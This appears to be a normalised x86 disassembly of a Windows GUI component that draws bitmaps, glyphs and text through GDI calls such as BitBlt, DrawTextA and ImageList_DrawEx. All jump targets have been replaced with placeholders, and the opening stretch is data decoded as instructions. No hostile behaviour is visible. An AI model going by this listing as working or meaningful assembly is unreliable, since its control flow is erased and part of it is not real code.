mov eax 0x6c004010
inc ebx
add [ eax ] dh
add [ eax ] al
add [ eax + 0x6c004010 ] bh
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc esp
pop es
inc ebx
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] dh
outsb
jae r-xdata
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] bl
add al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add al 0x43
add [ eax ] cl
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
cmp ch [ edi * 8 - 0x7f2c7401 ]
loop r-xdata
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
call sub_44a4a0
test bl bl
jle r-xdata
rol [ eax - 0x3974031e ] cl
mov eax esi
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44a44c
sub_430310
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
add eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
add eax [ ebx ]
mov [ eax ] al
add [ eax ] al
int3
sub_430480
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44a44c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4304d4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44a4a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_430504
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_414678
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414634
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44a8d4
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_414590
sub_430550
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_430504
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44aae0
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43057c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414660
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414634
sub_4305ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4305f0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_430620
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_430480
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413fac
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414108
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_430680
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_4142a4
mov eax ebx
call sub_403124
sub_4306b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_4307e4
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403448
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4305ac
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_430744
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403124
mov eax esi
call sub_4307a0
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_4306a4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
mov eax [ rw-data ]
call sub_403124
xor eax eax
mov [ rw-data ] eax
sub_4307a0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_43057c
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_430680
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_4307e4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4235c8
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_4307a0
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_430814
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4307a0
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_4235c8
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_43088c
mov eax 0x1
sub_43088c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_4307a0
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4307e4
sub_4308b4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_430e63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412cd4
mov eax [ ebp - 0xc ]
call sub_4234dc
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41e64c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_422ca4
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412cd4
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_430620
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4305ac
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4234dc
push eax
mov eax [ ebp - 0xc ]
call sub_4234dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41e8bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_430550
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_430550
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_430e27
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_4234dc
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41e64c
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_423598
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_4234dc
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4234dc
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41e8bc
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4242ac
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_4234dc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41e64c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4234dc
push eax
mov eax [ ebp - 0x14 ]
call sub_4234dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41e8bc
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41e64c
mov eax [ ebp - 0x18 ]
call sub_41ed94
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4234dc
call sub_41ed94
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_4234dc
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41e64c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4234dc
push eax
mov eax [ ebp - 0x14 ]
call sub_4234dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41e8bc
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41e64c
mov eax [ ebp - 0x18 ]
call sub_41ed94
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4234dc
call sub_41ed94
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41d9c0
push eax
mov eax [ ebp - 0x10 ]
call sub_4234dc
mov eax [ eax + 0x14 ]
pop edx
call sub_41e64c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4234dc
push eax
mov eax [ ebp - 0x14 ]
call sub_4234dc
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41e8bc
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41e64c
mov eax [ ebp - 0x18 ]
call sub_41ed94
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4234dc
call sub_41ed94
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4242ac
mov eax [ ebp - 0xc ]
call sub_4234dc
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41e64c
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41e9f0
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41e64c
push 0x0
mov eax ebx
call sub_41ed94
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41ed94
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4234dc
call sub_41ed94
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41ed94
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41e64c
push 0x0
mov eax ebx
call sub_41ed94
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41ed94
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4234dc
call sub_41ed94
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41ed94
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_4234dc
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41de80
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4242ac
mov eax [ ebp - 0x14 ]
call sub_4234dc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41e64c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403124
mov eax [ ebp - 0x14 ]
call sub_403124
retn
sub_430e8c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_4308b4
mov esi eax
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41ed94
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44a798
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41d9c0
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41ed94
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44a798
push eax
call ImageList_DrawEx
call sub_4335f0
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_433934
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_44a798
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41ed94
push eax
call sub_4335f0
lea ecx [ ebp - 0x14 ]
pop edx
call sub_433820
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_430ff0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41e768
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041b8
push eax
mov eax esi
call sub_4043b8
push eax
mov eax ebx
call sub_41ed94
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41de80
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041b8
push eax
mov eax esi
call sub_4043b8
push eax
mov eax ebx
call sub_41ed94
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41de80
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041b8
push eax
mov eax esi
call sub_4043b8
push eax
mov eax ebx
call sub_41ed94
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4310d0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_412cac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412cac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_412cac
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412cd4
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_412cac
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412cd4
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_4041b8
push eax
mov eax [ ebp + 0x20 ]
call sub_4043b8
push eax
mov eax [ ebp - 0x8 ]
call sub_41ed94
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_412cac
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_4041b8
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_412cac
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_412cac
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_412cac
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
